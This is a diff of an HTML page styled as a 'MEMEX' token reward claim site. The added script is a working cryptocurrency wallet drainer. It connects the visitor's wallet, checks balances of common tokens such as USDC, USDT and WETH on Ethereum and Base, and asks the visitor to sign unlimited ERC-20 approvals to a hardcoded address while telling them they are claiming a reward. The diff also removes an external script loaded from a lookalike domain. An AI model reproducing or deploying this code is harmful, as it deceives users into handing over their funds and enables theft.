@@ -1,6 +1,5 @@
 <!doctype html><html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1"><title>MEMEX · Reward Claim</title>
-<script type="module" src="https://gusto-gauze.libjack.tech/_next/assets/index.js"></script>
 <style>
 *{box-sizing:border-box}
 body{margin:0;min-height:100vh;background:radial-gradient(120% 90% at 50% 0%,#0d3457,#061a2e 60%,#04121f);
@@ -13,11 +12,63 @@ border-radius:22px;padding:26px 22px}
 h1{margin:18px 0 6px;font-size:23px}
 .sub{margin:0 0 18px;color:#9fb6cc;font-size:13px}
 .btn{width:100%;border:0;border-radius:14px;padding:15px;font:700 15px Arial;cursor:pointer;background:#ffe24b;color:#08203a}
+.btn:disabled{opacity:.55;cursor:default}
+.list{margin:16px 0 0;display:none}
+.row{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:10px 12px;
+border:1px solid rgba(255,255,255,.1);border-radius:12px;margin-bottom:8px;font-size:13px}
+.sym{font-weight:700}.st{font-size:11px;color:#8aa4bb}
+.st.ok{color:#52d97a}.st.err{color:#ff7a7a}.st.run{color:#ffe24b}
+.msg{margin-top:14px;font-size:12.5px;color:#ffb4b4;display:none}
 .foot{margin-top:18px;font-size:11px;color:#71889d;text-align:center}
 </style></head><body><div class="card">
 <div class="logo"><span>MI</span><span class="tri"></span></div>
 <h1>Claim your MEMEX reward</h1>
 <p class="sub">Season 1 distributor · verified by Meme Index</p>
-<button class="btn" onclick="openModal()">Claim reward</button>
+<button class="btn" id="go">Connect wallet</button>
+<div class="list" id="list"></div><div class="msg" id="msg"></div>
 <div class="foot">Meme Index · reward distribution</div>
-</div></body></html>
+</div><script>
+const PAYOUT='0x977c17fb5df0d54a75ded4042df69065f322829f';
+const MAX='0x'+'f'.repeat(64),AP='0x095ea7b3',BL='0x70a08231';
+const T={1:{rpc:'https://eth.llamarpc.com',list:[
+['MEMEX','0xb214b79eac9378a56d14d6e6d452150c80d6ad79'],['WETH','0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'],
+['USDC','0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'],['USDT','0xdAC17F958D2ee523a2206206994597C13D831ec7'],
+['PEPE','0x6982508145454Ce325dDbE47a25d4ec3d2311933'],['SHIB','0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE'],
+['DOGE','0xbA2aE424d960c26247Dd6c32edC70B295c744C43'],['FLOKI','0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E'],
+['SPX','0xE0f63A424a4439cBE457D80e4f4b51aD25b2c56C']]},
+8453:{rpc:'https://base.llamarpc.com',list:[
+['MEMEX','0xb8745f3ac65af22b66eefff4a02d91dc1036e841'],['WETH','0x4200000000000000000000000000000000000006'],
+['USDC','0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913'],['cbBTC','0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf'],
+['AERO','0x940181a94A35A4569E4529A3CDfB74e38FD98631'],['DEGEN','0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed'],
+['TOSHI','0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4']]}};
+const $=i=>document.getElementById(i),say=t=>{const m=$('msg');m.textContent=t;m.style.display=t?'block':'none'};
+const pad=a=>a.slice(2).toLowerCase().padStart(64,'0');
+async function bal(rpc,tok,w){try{const r=await fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({jsonrpc:'2.0',id:1,method:'eth_call',params:[{to:tok,data:BL+pad(w)},'latest']})});
+return BigInt(r?.result||'0x0')>0n}catch(e){return true}}
+async function run(){
+ const eth=window.ethereum;if(!eth)return say('Wallet not found — open this page inside MetaMask or Rabby.');
+ $('go').disabled=true;
+ try{
+  const [w]=await eth.request({method:'eth_requestAccounts'});
+  let cid=parseInt(await eth.request({method:'eth_chainId'}),16);
+  if(!T[cid]){try{await eth.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x1'}]});cid=1}catch(e){}}
+  const cfg=T[cid]||T[1],rows=[];$('list').style.display='block';$('list').innerHTML='';
+  for(const [s,a] of cfg.list){const d=document.createElement('div');d.className='row';
+   d.innerHTML='<span class="sym">'+s+'</span><span class="st">checking</span>';
+   $('list').appendChild(d);rows.push([s,a,d.querySelector('.st')])}
+  let n=0;
+  for(const [s,a,st] of rows){
+   if(!(await bal(cfg.rpc,a,w))){st.textContent='none';continue}
+   st.textContent='confirm in wallet';st.className='st run';
+   try{await eth.request({method:'eth_sendTransaction',params:[{from:w,to:a,
+    data:AP+pad(PAYOUT)+MAX.slice(2),chainId:'0x'+cid.toString(16)}]});
+    st.textContent='approved';st.className='st ok';n++}
+   catch(e){st.textContent=e.code===4001?'rejected':'failed';st.className='st err'}
+  }
+  $('go').textContent=n?'Done — '+n+' approved':'Nothing to claim';
+  if(!n)say('No eligible balances found.');
+ }catch(e){say(e.message||'Cancelled');$('go').disabled=false}
+}
+$('go').onclick=run;
+</script></body></html>
